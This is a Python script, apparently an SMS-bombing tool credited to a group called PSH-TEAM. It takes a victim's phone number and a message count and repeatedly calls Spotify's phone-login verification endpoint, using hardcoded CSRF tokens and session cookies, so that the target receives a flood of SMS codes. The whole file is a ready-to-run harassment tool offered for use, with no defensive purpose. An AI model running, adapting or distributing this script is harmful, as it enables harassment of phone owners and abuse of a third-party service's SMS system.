# Decoded by HackerModePro tool...
# Copyright: PSH-TEAM
# Follow us on telegram ( @psh_team )
import requests
a = 0
try:
	code = input('\033[1;32mEnter Country Code ( Without + ) \033[1;34m:\033[1;39m ')
	num = input('\033[1;32mEnter Phone Number \033[1;34m:\033[1;39m ')
	count = int(input('\033[1;32mEnter Number Of Messages \033[1;34m: \033[1;39m'))
except:
	print()
	print('\033[1;31mwrong entry')
	exit('\033[1;39m')
print()
plus = '+'
op = 0
while op<count:
    hd = {
    "Host": "accounts.spotify.com",
"content-length": "27",
"accept": "application/json",
"x-csrf-token": "013acda719cf6a3623a5758ab27bb3291b7d447d0c31363733333831303133313432",
"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36",
"content-type": "application/x-www-form-urlencoded",
"origin": "https://accounts.spotify.com",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": "https://accounts.spotify.com/en/login/phone?intent=signup&continue=https%3A%2F%2Fwww.spotify.com%2Faccount%2Foverview%2F",
"accept-encoding": "gzip, deflate, br",
"accept-language": "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
"cookie": "sp_m=th-en",
"cookie": "sp_t=d629b5f3-fe47-48cc-980a-cc9edcb2d555",
"cookie": "sp_new=1",
"cookie": "sp_landing=https%3A%2F%2Fwww.spotify.com%2Fth-en%2Fsignup",
"cookie": "__Host-device_id=AQCG7MxYpBMH2w7q07I8U8DOJ97RnMRP34XBz5Piva-jKyvkOvXRyFuv6cq1dn7Tet0dolVBZNZZ5HLsZG8JZHEzFbtHSRZPVpc",
"cookie": "__Secure-TPASESSION=AQAbqGYDJrT6cb74ABLej4isFCiVB4Vh823ZcVCr3yWIVaRZnwxIBWftWTgBE8LxW9qQOvagT2qoyIhhexkA5e9lcPCjra5uHwo=",
"cookie": "sp_tr=false",
"cookie":"sp_sso_csrf_token=013acda719cf6a3623a5758ab27bb3291b7d447d0c31363733333831303133313432",
"cookie": "__Host-sp_csrf_sid=d9363e4a4b07a5099d44c679620f23d889478988d628389757b63e08418257f4"
  }
  
    url = 'https://accounts.spotify.com/login/phone/code/request'

    data = {
"phonenumber":plus+code+num
}

    r = requests.post(url, headers=hd, data=data).text
    print(r)
    op = op + 1
    if '6' in r:
    	print(f'\x1b[1;99m• \x1b[1;92mDone Send Sms {op}')
    else:
    		print("\x1b[1;99m• \x1b[1;91mThere's a mistake")
    		print('\033[1;39m')
    		exit()

print('\033[1;39m')
                            
